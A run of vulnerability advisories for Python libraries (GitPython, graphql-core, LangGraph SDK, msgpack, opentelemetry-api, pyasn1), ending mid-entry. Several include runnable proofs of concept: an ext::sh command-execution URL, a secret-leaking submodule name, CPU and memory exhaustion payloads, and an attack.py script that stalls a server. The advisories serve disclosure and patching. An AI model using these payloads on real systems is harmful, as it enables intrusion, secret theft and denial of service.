### Summary  GitPython has spent 2022-2026 rolling out two reusable guards method-by-method: `Git.check_unsafe_protocols(url)` (raises `UnsafeProtocolError` for `<transport>::` remote-helper URLs - CVE-2022-24439) and `Git.check_unsafe_options(...)` (raises `UnsafeOptionError` for denylisted option spellings - CVE-2023-40267, CVE-2026-42215, CVE-2026-67323). Three wrapper methods that build a `git` argv from caller-controlled values still have **neither**:  1. **`Git.ls_remote`** (git/cmd.py:1128-1143) - checks options (:1139-1141) but forwards the URL positional unchecked; no `allow_unsafe_protocols` parameter exists. The same URL through `clone_from` raises `UnsafeProtocolError`. 2. **`Repo.merge_base`** (git/repo/base.py:895-936) - forwards `**kwargs`/`*rev` to `self.git.merge_base` with no guard; guarded sibling `iter_commits` sits 12 lines up. Its exception handler additionally swallows every non-128 `GitCommandError` into `[]`, masking the injection. 3. **`IndexFile.move`** (git/index/base.py:1092-1168) - forwards `**kwargs` to `git mv` twice (:1147, :1167); guarded sibling `remove()` is 23 lines above.  Verified unfixed on `main @ a54d159` (2026-09-21), post-dating latest release 3.1.62 (2026-09-07) - all three sites re-verified today.  ### Impact  **Site 1 (`ls_remote`)** - RCE conditional on the victim git transport policy. The common 'probe first, then clone' pattern (`Git(...).ls_remote(attacker_url)`) with an `ext::sh -c ...` URL executes arbitrary commands when the victim git permits the ext transport: dynamically verified with `protocol.ext.allow=always` (marker executed). git >= 2.38.1 stock config refuses the transport (`fatal: transport 'ext' not allowed`, rc 128) - GitPython adds no defense-in-depth and surfaces a bare `GitCommandError`. Environments on git < 2.38.1 are exposed with stock config - the exact population CVE-2022-24439 was scored against.  **Sites 2/3** - latent argument-injection surface: caller kwargs flow 1:1 into the `git` argv before operands and `--` (cmd.py:1850 `opt_args + ext_args`), and `execute_kwargs` (incl. `shell=True`/`env` - the CVE-2023-40267 Windows mechanism) passes through unguarded. Today `git merge-base`/`git mv` expose no exec option, so we claim the missing-guard class (vendor-settled by CVE-2026-67323, which bundled archive/ls_remote/iter_commits/blame in one advisory), not direct RCE.  ### Dynamic verification (today; GitPython main @ a54d159, git 2.55.0, Linux)  | # | Call | Result | |---|---|---| | T1 | `repo.git.ls_remote('ext::/tmp/gp_touch.sh')`, stock config | git refuses (rc 128); **no `UnsafeProtocolError` from GitPython** | | T1b | same + victim config `protocol.ext.allow=always` | **marker created - arbitrary command executed** | | T2 | `repo.git.ls_remote('.', upload_pack=...)` | blocked by cmd.py:1141 (options-side fixed - protocol-side is the residual gap) | | T3 | `repo.merge_base('main','side', upload_pack=...)` | **not blocked**; argv `git merge-base --upload-pack=... main side`; rc 129 silently converted to `[]` | | T4 | `repo.index.move(['f1','f2'], output=...)` | **not blocked**; option reaches `git mv` (rc 129) |  ### Coverage matrix (main @ a54d159)  `check_unsafe_protocols`: 7 call sites (`_clone`, `archive`, `set_url`, `create`, `fetch`, `pull`, `push`) - none on `ls_remote`. `check_unsafe_options`: 24 call sites incl. `ls_remote`, `iter_commits`, `IndexFile.remove` - absent on `merge_base` and `move`.  ### Precedents (same repo, same guard family)  - **CVE-2022-24439 / GHSA-hcpj-qp55-gfph** (critical): `check_unsafe_protocols` on the clone path - Site 1 is the same `ext::` primitive on a sibling API. - **CVE-2023-40267 / GHSA-pr76-5cm5-w9cj** (critical, 'incomplete fix for CVE-2022-24439'): `check_unsafe_options` - unguarded kwargs to argv treated as RCE (`shell=True` on Windows). - **CVE-2026-42215 / GHSA-rpm5-65cw-6hj4** (high, fixed 3.1.47): underscored-spelling bypass - rollout still active in 2026. - **CVE-2026-67323 / GHSA-956x-8gvw-wg5v** (high, 8.4, fixed 3.1.51): added `check_unsafe_options` to `archive`/`ls_remote`/`iter_commits`/`blame`; its PoC is literally `repo.git.ls_remote('.', upload_pack=...)`. Establishes that a wrapper missing the check is itself a vulnerability. This report is the residual gap of that rollout: `ls_remote` got options but not protocols; `merge_base`/`move` got neither.  ### Recommended fix (existing helpers, 1-3 lines per site)  1. `Git.ls_remote`: `if not allow_unsafe_protocols: self.check_unsafe_protocols(args[0])` + new `allow_unsafe_protocols: bool = False` (the `_clone` pattern, base.py:1536-1538). 2. `Repo.merge_base`: `check_unsafe_options(Git._option_candidates(list(rev), kwargs), unsafe_options=self.unsafe_git_revision_options)` (the `iter_commits` pattern); stop masking non-128 statuses. 3. `IndexFile.move`: the `remove()` pattern with `unsafe_git_pathspec_from_file_options`.  One advisory, three affected methods, severity anchored on Site 1 - mirroring CVE-2026-67323's bundling.

### Summary `Repo._clone()`'s handling of `separate_git_dir` never disables `Git.polish_url()`'s environment-variable expansion, unlike every other caller of that helper that handles attacker-influenced data. Since `separate_git_dir` can be derived from an attacker-controlled `.gitmodules` submodule name, a completely ordinary `clone` + `submodule_update(init=True, recursive=True)` on a malicious repository expands an environment variable of the attacker's choosing and exposes its value both as a persistent on-disk directory name and, whenever DEBUG-level logging is enabled (a common CI/verbose-logging configuration), in a `Popen(...)` log line that is not redacted the way credential-bearing arguments are.  ### Root cause / Details `git/repo/base.py`'s `_clone()` has:  ```python sep_dir = kwargs.get("separate_git_dir") if sep_dir:     kwargs["separate_git_dir"] = Git.polish_url(sep_dir) ```  This is the only remaining `Git.polish_url()` call site handling attacker-influenced data that does not pass `expand_vars=False` (there is one other unguarded call site, `clone_path` at line 1537, but its input is the caller's own local destination path, not attacker-controlled). The sibling fixes for `GHSA-94p4-4cq8-9g67`/`GHSA-rwj8-pgh3-r573` added `expand_vars=False` to `clone_url` (5 lines below this one, in the same function), `git/repo/base.py:1599`, `remote.py:814`, and `submodule/base.py:686` — this one did not receive it. (`submodule/root.py` also currently sets `expand_vars=False` at a related call site, but that was added incidentally by a later, unrelated commit, not as part of these security fixes.) `Git.polish_url()`'s docstring itself says: "Disable this for values obtained from an untrusted source, such as remote URLs." Its non-Cygwin branch does plain `os.path.expandvars()` on the entire string, including embedded variables anywhere in an absolute path.  `separate_git_dir` reaches `_clone()` from `Submodule._clone_repo()` (`git/objects/submodule/base.py`) as `module_abspath = osp.join(parent_repo.git_dir, "modules", name)`, where `name` is the raw `.gitmodules` submodule section name — fully attacker-controlled content of a cloned repository. `_validated_name()` (added by the fix for `GHSA-hmq2-w58f-27jc`) only rejects names that are absolute, contain a drive letter, or contain `..` path components; it does not reject `$`. `_need_gitfile_submodules()` is true for git ≥ 1.7.5, i.e. the default path for virtually every real-world installation.  ### Reproduction (live, against real, unmodified GitPython code, no monkeypatching) Built a hostile repository with a plain, ordinary git command: `git submodule add --name '$GPY_SECRET_MARKER' ../evil_submodule sub`. Set an environment variable in the "victim" process (standing in for a real CI secret such as `AWS_SECRET_ACCESS_KEY`): `GPY_SECRET_MARKER=AKIA_TOTALLY_FAKE_BUT_SECRET_LOOKING_VALUE_12345`. Then ran the exact ordinary workflow the `GHSA-hmq2-w58f-27jc` advisory's own PoC also uses:  ```python repo = Repo.clone_from(evil_parent_url, victim_clone_dir) repo.submodule_update(init=True, recursive=True) ```  Observed result (`ls .git/modules/`):  ``` .git/modules/AKIA_TOTALLY_FAKE_BUT_SECRET_LOOKING_VALUE_12345/   (a full git repo: HEAD, config, objects/, refs/, hooks/) ```  The literal `$GPY_SECRET_MARKER`-named directory was never created — only the expanded one exists, proving expansion happened before the value reached the `git clone --separate-git-dir=...` subprocess argument. The persistent, expanded-name directory under `.git/modules/` is itself the primary disclosure channel — it survives on disk for as long as the clone does. A second, independent channel: with the `git.cmd`/`git.repo.base` loggers at DEBUG level (a common CI/verbose-logging setting, not requiring any special flag), GitPython's own `Popen(...)` debug log line prints the fully expanded `--separate-git-dir=<value>` subprocess argument verbatim — `remove_password_if_present()` only redacts URL passwords/Authorization headers, not path-style arguments like this one, so the expanded value is not scrubbed. (The call also fails downstream with an `OSError`/`FileNotFoundError` referencing the original, unexpanded name, since `_write_git_file_and_module_config()` looks for a directory using the pre-expansion name — but that error message itself does not contain the expanded/secret value.)  **Control**: the same call with an ordinary (no `$`) submodule name succeeds normally and creates `.git/modules/<name>` as expected — isolating the gap to submodule names containing environment-variable syntax specifically.  ### Already-known check Checked all 35 published `gitpython-developers/GitPython` security advisories in full text. `GHSA-hmq2-w58f-27jc` covers the same `name` → `.git/modules/<name>` path but for path-traversal (`../../..`), not variable expansion. `GHSA-59cr-6r3x-644w` covers the sibling `path` field reaching unguarded `os.makedirs()`. `GHSA-94p4-4cq8-9g67`/`GHSA-rwj8-pgh3-r573` cover `expand_vars`, but only on URL arguments. `git log -p -S "separate_git_dir" -- git/repo/base.py` shows neither fix commit touches this line; it is unchanged since its 2016 introduction (commit `57d05379`).  The closest topical match is `GHSA-8mcc-hrx5-hvxc` ("`clone_from()`/`clone()` omit `--separate-git-dir` from `unsafe_git_clone_options`") — already fixed, and its own text discusses this same `_clone()` handling of `separate_git_dir`. That fix only added `--separate-git-dir` to the `unsafe_git_clone_options` denylist, which gates the direct-kwarg vector; `Submodule._clone_repo()` explicitly sets `allow_unsafe_options=True` for the gitfile-submodules path, unconditionally bypassing that exact denylist (confirmed: the reproduction above succeeds against current `main`, which already has that fix). The bug this report describes is independent of that denylist — the *value* itself is expanded via `os.path.expandvars()` regardless of the denylist outcome — so the two are distinct, but flagging the relationship explicitly since a reviewer would otherwise reasonably ask about it.  No advisory describes environment-variable expansion via the internal `separate_git_dir` path.  ### Suggested fix Add `expand_vars=False` to the `Git.polish_url(sep_dir)` call in `_clone()`, matching the four other call sites already fixed for the same class of issue.  ### Verification level Reproduced in a real environment: plain Linux, unmodified GitPython from current `main`, real git ≥ 1.7.5 behavior, an ordinary `git submodule add` + `clone` + `submodule_update(init=True, recursive=True)` workflow with no non-default configuration or monkeypatching required. Causation isolated via a control group (identical workflow, ordinary submodule name, no expansion).  ### AI Use Disclosure AI (Claude) was used as a tool under my direction for code review, code summarization, and script development. A human reviewed and verified the AI-generated results before submission.  Credit: please use "baeseungwon1010" (github.com/baeseungwon1010).

### Summary  The `OverlappingFieldsCanBeMerged` validation rule can be driven into quadratic — and in the worst case `O(n²·m²)` — running time by a small, highly compressible query. A single 364 KB document can occupy one CPU core for over five minutes during *validation*, before any resolver runs. Because the rule is part of `specified_rules` and therefore enabled by default, every GraphQL-core based server is affected at default settings.  ### Details  `OverlappingFieldsCanBeMerged` compares every pair of fields that share a response name and recurses into their sub-selections. The memoization added for CVE-2023-26144 (`GHSA-9pv7-vfvm-6vr7`) is keyed by **named fragment** identity, so it does not cover this path: inline fragments are flattened into the parent selection set before the cache is consulted, and therefore every pair is re-compared from scratch at every nesting level.  Repeating an inline fragment that selects the same response name at two nesting levels multiplies the two effects. There was no comparison budget and no validation timeout, so the rule ran to completion regardless of cost.  The cost is incurred in the **validation phase**, which is what makes this hard to defend against from outside the library: query-depth limiters, complexity analyzers and cost estimators all operate on the parsed document *after* validation, and the malicious document is trivially shallow (depth 3, complexity 1). The payload is also one short string repeated many times, so it compresses to a few kilobytes and slips past body-size limits and WAF inspection that only see the compressed request.  ### Proof of concept  ```python import time from graphql import build_schema, parse, validate  schema = build_schema(     "type Query { field: Node } type Node { f: Node, g: Node, x: String }" )  def gen(n: int, m: int) -> str:     inner = " ".join(["... on Node { x }"] * m)     outer = " ".join([f"... on Node {{ f {{ {inner} }} }}"] * n)     return f"{{ field {{ {outer} }} }}"  query = gen(200, 100)          # 364 KB, gzips to a few KB document = parse(query) start = time.perf_counter() validate(schema, document)      # returns no errors — it just burns CPU print(f"{(time.perf_counter() - start):.0f}s") ```  Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64:  | n | m | query size | validation time | |---|---|---|---| | 20 | 20 | 7.6 KB | 0.16 s | | 50 | 50 | 46 KB | 5.2 s | | 100 | 100 | 182 KB | 81 s | | 200 | 100 | 364 KB | **319 s** |  Doubling `n` at fixed `m` quadruples the time, as expected for a quadratic outer loop driving a quadratic inner walk.  ### Impact  Denial of service. One request pins one worker process for minutes; because CPython holds the GIL for this pure-CPU work, a handful of concurrent requests can saturate a typical multi-worker deployment. No authentication is required, and no data is disclosed or modified.  ### Patches  Fixed in **3.2.12** and **3.3.0rc1**.  Validation now enforces a per-document comparison budget. Once `MAX_FIELD_COMPARISONS` (default `250_000`) pairwise comparisons have been made, the rule aborts and reports a `GraphQLError` instead of running to completion:  > Query is too complex to validate for overlapping fields: exceeded 250000 field > comparisons. Validation was aborted.  The default is far above what any realistic query reaches. It is a module-level constant and can be raised or lowered:  ```python from graphql.validation.rules import overlapping_fields_can_be_merged  overlapping_fields_can_be_merged.MAX_FIELD_COMPARISONS = 1_000_000 ```  Note the behaviour change: a pathological query that previously validated — slowly — now produces a validation error.  ### Workarounds  If you cannot upgrade, reject oversized documents before they reach `validate()`. Note that a request body-size limit must be applied to the **decompressed** body to be effective here, since the payload is highly compressible. Removing `OverlappingFieldsCanBeMergedRule` from the rule set is *not* a safe workaround: it is a correctness rule required by the specification.  A body-size limit remains worthwhile after upgrading — the comparison budget bounds this specific rule, not overall request cost.  ### Credits  Reported by @BZHunt, who also reviewed the fixes before release. In memory of ZaX, who was the driving force behind this discovery.  Independently found and diagnosed by @bcmyguest, who also proposed a fix.

### Summary  The parser's `max_tokens` limit — the documented defence against oversized GraphQL documents — did not count comment tokens. A document padded with comments could therefore pass a `max_tokens` check of any size while still allocating one `Token` object per comment, all of which stay reachable for the lifetime of the parsed document. A 38 MB comment-padded payload allocated roughly 92 MB of additional resident memory with `max_tokens=5` in force.  ### Details  `Lexer.lookahead()` reads tokens one at a time and skips over comments, returning only the first non-comment token. Each skipped comment is nevertheless fully tokenized, allocated as a `Token` object, and linked into the persistent token list via `token.next` / `token.prev` — the chain that powers source-location reporting, and which is retained as long as the document is.  `Parser.advance_lexer()` incremented the token counter only for the tokens the lexer actually returned. Comments were therefore invisible to the accounting, and `max_tokens` bounded only the *non-comment* tokens.  The practical consequence is a gap between what users reasonably believe `max_tokens` protects and what it did protect. The limit was not broken for ordinary documents — real tokens were still capped correctly — so the shortfall was not observable without specifically testing comment padding.  As with the companion issue, the payload compresses extremely well (`# c
` repeated), so body-size limits and WAF inspection applied to the compressed request do not see its true size, while the framework decompresses it in memory before the parser is reached.  ### Proof of concept  ```python import gc import resource from graphql import parse  # 100,000 comments, a 5-token query, and max_tokens=5 — accepted. query = "# c
" * 100_000 + "{ a }" parse(query, max_tokens=5)          # no error raised  # Memory amplification. big = "# padding comment used to amplify memory per token
" * 500_000 + "{ a }" gc.collect() before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss parse(big, max_tokens=5)            # ~38 MB source after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss print(f"RSS delta: +{(after - before) / 1024:.0f} MB") ```  Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64: the 391 KB payload parsed in 127 ms, and the 38.1 MB payload produced an RSS delta of **+92 MB** — about 2.4× the source size, on top of the source string itself.  ### Impact  Denial of service through memory exhaustion. A modest number of concurrent requests can push a worker past a typical 256 MB or 512 MB container limit and trigger an OOM kill. No authentication is required, and no data is disclosed or modified.  Depth limiters and complexity analyzers do not help: they run on the AST after parsing has already succeeded, and the document contains only five real tokens.  ### Patches  Fixed in **3.2.12** and **3.3.0rc1**.  `Parser.advance_lexer` now counts every token consumed, including the comment tokens the lexer skips between the previously focused token and the new one, and including the advance onto EOF so that trailing comments are covered. `max_tokens` therefore now bounds every `Token` the parser allocates.  Note the behaviour change: **comments now count toward `max_tokens`.** A comment-heavy document that was previously accepted may now be rejected. If you parse documents containing substantial comments — SDL files with documentation comments, for instance — and you set `max_tokens`, you may need to raise the limit. The `token_count` attribute of a parsed document likewise now includes comments.  ### Workarounds  If you cannot upgrade, apply a request body-size limit to the **decompressed** body before the document reaches `parse()`.  Such a limit is worth keeping after upgrading as well: `max_tokens` is one guard among several and bounds the token count, not the overall cost of a request.  ### References  - GraphQL specification § 2.1.4 — Comments  ### Credits  Reported by @BZHunt, who also reviewed the fixes before release. In memory of ZaX, who was the driving force behind this discovery.

### Summary  The LangGraph Python SDK v3 streaming client interpolates caller-supplied `thread_id` and `assistant_id` values into request paths without encoding them at four synchronous and asynchronous call sites. Relative path segments can therefore redirect an authenticated GET request to another path on the same configured server.  ### Details  The affected `get_tree` and `_fetch_state` implementations build request paths from raw identifiers rather than passing each identifier through the SDK's existing `_quote_path_param` helper. HTTP path normalization can collapse values containing relative segments before dispatch while retaining the client's authentication headers.  `langgraph-sdk` versions 0.4.0 through 0.4.5 are affected. The v3 stream module is not present in the 0.3.x release line.  `RemoteGraph` v3 streaming in `langgraph` 1.2.3 and later is also affected when used with a vulnerable `langgraph-sdk` version. It passes `config["configurable"]["thread_id"]` into `threads.stream(...)`, and its dependency range permits affected SDK versions.  ### Impact  An application is affected only if it passes attacker-controlled text as a streaming `thread_id` or `assistant_id`. In that configuration, an attacker may select another readable path on the configured server and cause the SDK to return that response to the application. Through `thread_id`, the attacker can also control the query string, for example by targeting `/store/items?namespace=...&key=...`; `assistant_id` controls only the path. The affected requests are GET operations, so this issue does not provide a write primitive.  The LangGraph Platform is not exposed to this issue.  ### Remediation  Upgrade `langgraph-sdk` to version 0.4.6 or later. The fix encodes `assistant_id` in `get_tree` and `thread_id` in `_fetch_state` with `_quote_path_param` in both synchronous and asynchronous stream modules.  If you use `RemoteGraph`, also upgrade `langgraph` to version 1.2.14 or later, which requires `langgraph-sdk>=0.4.6`.

### Impact  The msgpack-python C extension (`msgpack._cmsgpack`) leaks a decoded map value when deserialization rejects a key with `strict_map_key=True` (the default). Repeated malformed inputs can cause unbounded process memory growth and denial of service in applications that deserialize attacker-controlled MessagePack data. Both `unpackb()` and the streaming `Unpacker` API are affected. The pure-Python fallback does not exhibit this leak in the reported tests.  The report measured approximately 4 MiB retained per failed parse and 100 MiB after 25 failed parses on Windows with Python 3.14 and msgpack 1.2.2. These are reporter-provided results.  ### Additional impact: stale parser-stack references  The reference-ownership audit performed while fixing this leak found an additional memory-safety issue in the streaming `Unpacker`.  After `unpack()` completed a nested container, an inactive parser-stack slot could retain a non-owning pointer to the decoded object. A subsequent `skip()` could reactivate that slot. If parsing then failed, context cleanup treated the stale pointer as an owned reference and decremented it.  This corrupts the object's reference count and can result in a use-after-free or double `Py_DECREF` when its actual owners later release it.  Although few users use this API, but those who do may experience crashes or unexpected errors due to a use-after-free.  ### Details  In `msgpack/unpack.h`, `unpack_callback_map_item()` rejects keys that are neither `str` nor `bytes`. At this point the map value has already been constructed. The early error return does not release the value reference.  In `msgpack/unpack_template.h`, the value is held in the local `obj` in `unpack_execute()`. The `CT_MAP_VALUE` error path jumps to `_failed` without decrementing that reference. Cleanup of the parser stack does not recover the value because it is not stored in the stack. The fallback checks the key before decoding the value.  ### Affected versions  The report reproduces the issue on **1.2.2** and reports it on development commit `475c1b7`. The affected-product field lists the reproduced release only; it is not a claim that earlier releases are unaffected.  The earliest affected release needs confirmation: the report's summary says 1.1.x through 1.2.2, while its root-cause analysis attributes introduction to commit `cd81370` (PR #673). Resolve this discrepancy before publishing a definitive affected-version range.  ### Reproduction  Run in a disposable local process with the C extension installed:  ```python import msgpack  payload = msgpack.packb({42: b"A" * (4 * 1024 * 1024)}, use_bin_type=True) msgpack.unpackb(payload)  # Raises ValueError; the report observes a 4 MiB leak. ```  Streaming API trigger:  ```python import msgpack  payload = msgpack.packb({42: b"A" * (4 * 1024 * 1024)}, use_bin_type=True) u = msgpack.Unpacker() u.feed(payload) list(u)  # Same strict_map_key error path. ```  ### Workarounds  The pure-Python fallback is reported not to leak on this path and may be used as a temporary workaround after application compatibility and performance checks. Request-size and rate limits may reduce the impact but do not eliminate cumulative leakage.

## Summary `TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.  ## Affected component / version - Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`). - Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between. - Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.  ## Details  1. The header reaches the parser without any length check:  ```python # opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57 tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size if tracestate_headers is None:     tracestate = None else:     tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61) ```  2. The split pattern and the parser: ```python # opentelemetry-api/src/opentelemetry/trace/span.py:45 _TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split _delimiter_pattern = re.compile(r"[ 	]*,[ 	]*")      # <-- (line 46) starts with an unbounded [ 	]*  # span.py:382 @classmethod def from_header(cls, header_list: list[str]) -> TraceState:     pairs = {}  # type: dict[str, str]     for header in header_list:         members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"         for member in members:             if not member:                 continue             match = _member_pattern.fullmatch(member)             if not match:                 _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)                     "Member doesn't match the w3c identifiers format %s",                     member,                 )                 return cls()             ... ```  `re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ 	]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.  3. The sibling propagator already has the missing guard: ```python # baggage/propagation/__init__.py:68 _MAX_HEADER_LENGTH = 8192 ... if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent     _logger.warning(...)     return context ```  A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s. Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: "a=b" + N spaces + "x"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower).   Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.  ## Proof of concept  ### A. Show the quadratic cost (no server needed)  1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected). 2. Save as `poc_tracestate.py`: ```python import logging import time  from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator  # The library logs the whole malformed member at WARNING; silence it so the timings stay readable. logging.disable(logging.CRITICAL)  TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01" propagator = TraceContextTextMapPropagator()  previous = None for n in (10_000, 20_000, 40_000, 80_000):     # N spaces after a valid member, no comma anywhere in the header     carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}     start = time.perf_counter()     propagator.extract(carrier)     elapsed = time.perf_counter() - start     growth = f"x{elapsed / previous:.1f}" if previous else "-"     print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")     previous = elapsed ``` 3. Run `python poc_tracestate.py`. 4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run: ```   10000 characters    0.06 s  growth when size doubles: -   20000 characters    0.26 s  growth when size doubles: x4.0   40000 characters    1.04 s  growth when size doubles: x4.0   80000 characters    4.13 s  growth when size doubles: x4.0 ``` Replace `" "` with `"	"` to see ≈1.6× longer.  ### B. Show that one request stalls a real server This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).  1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]"`. 2. Save as `app.py`: ```python from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware   async def app(scope, receive, send):     await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})     await send({"type": "http.response.body", "body": b"ok"})   app = OpenTelemetryMiddleware(app) ``` 3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools` 4. Save as `attack.py`: ```python """Send one oversized tracestate request and, while it is being handled, measure how long an unrelated request to the same server has to wait.""" import socket import sys import threading import time  HOST, PORT = "127.0.0.1", 8000 N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000 TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"   def get(path, extra=""):     s = socket.create_connection((HOST, PORT), timeout=120)     s.sendall(f"GET {path} HTTP/1.1
Host: x
Connection: close
{extra}
".encode())     start, data = time.perf_counter(), b""     while chunk := s.recv(65536):         data += chunk     return time.perf_counter() - start, data.split(b"
")[0].decode()   result = {} extra = f"traceparent: {TRACEPARENT}
tracestate: a=b{' ' * N}x
" attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra))) print("idle /ping:               %.3f s  %s" % get("/ping")) attacker.start() time.sleep(0.5)  # let the attack request reach the server first print("/ping during the attack:  %.3f s  %s" % get("/ping")) attacker.join() print("attack request itself:    %.3f s  %s" % result["a"]) ``` 5. In a second terminal run `python attack.py 100000`. 6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run: ``` idle /ping:               0.000 s  HTTP/1.1 200 OK /ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked) attack request itself:    6.408 s  HTTP/1.1 200 OK ``` 7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.  ## Severity **Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.  **Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.  **Severity: Medium.**  ## Suggested remediation Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input: ```diff --- a/opentelemetry-api/src/opentelemetry/trace/span.py +++ b/opentelemetry-api/src/opentelemetry/trace/span.py @@ def from_header(cls, header_list: list[str]) -> TraceState:          for header in header_list: -            members: list[str] = re.split(_delimiter_pattern, header) +            members: list[str] = [m.strip(" 	") for m in header.split(",")] ``` `_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.  ## Credit  Discovered and reported by SecDim Security Research secdim.com | @secdim | security@secdim.com  ---  **FROM MAINTAINERS**  ## Summary  `TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.  Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.  ## Impact  Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.  The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.  Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.  The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.  ## Patches  Versions of `opentelemetry-api` up to and including `1.45.0` are affected.  Upgrade `opentelemetry-api` to version `1.45.1` or later.  Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.  ## Workarounds  Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.

## Summary  In pyasn1 through 0.6.4, decoding a constructed BIT STRING with many fragments repeatedly shifts and copies the entire value accumulated so far. For fixed-size fragments, CPU time grows quadratically with the encoded input size. An application that passes sufficiently large, attacker-controlled ASN.1 data to an affected decoder can suffer CPU exhaustion during `decode()`; no conversion or formatting of the decoded value is required.  The BER and CER decoders reach this path for constructed BIT STRING values, with or without an `asn1Spec`. The DER decoder rejects constructed BIT STRING in schema-less decoding, but its schema-driven path accepts a **definite-length** constructed BIT STRING when given a matching `asn1Spec` and reaches the same vulnerable code. Constructed BIT STRING is not valid DER; this DER exposure is due to decoder permissiveness. DER rejects the indefinite-length form.  This is a separate decoder path from the OBJECT IDENTIFIER accumulation fixed in [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj).  ## Technical details  In the 0.6.4 [`BitStringPayloadDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L173-L301), both the 